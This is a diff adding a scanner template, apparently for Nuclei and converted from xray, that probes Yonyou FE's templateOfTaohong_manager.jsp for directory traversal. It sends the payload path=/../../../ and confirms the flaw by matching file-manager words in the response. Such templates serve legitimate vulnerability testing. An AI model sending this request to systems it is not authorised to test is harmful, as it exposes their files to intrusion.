@@ -1,0 +1,28 @@
+id: poc-yaml-yonyou-fe-templateoftaohong-manager-jsp-directory-traversal
+
+info:
+  name: poc-yaml-yonyou-fe-templateoftaohong-manager-jsp-directory-traversal
+  author: cysec
+  severity: medium
+  tags: xray-converted,ct-483417
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%20templateOfTaohong_manager.jsp%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - raw:
+      - |
+        GET /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/download.fe?filePath="
+          - "deletefile"
+          - "uploadfile"
+          - "downloadfile"
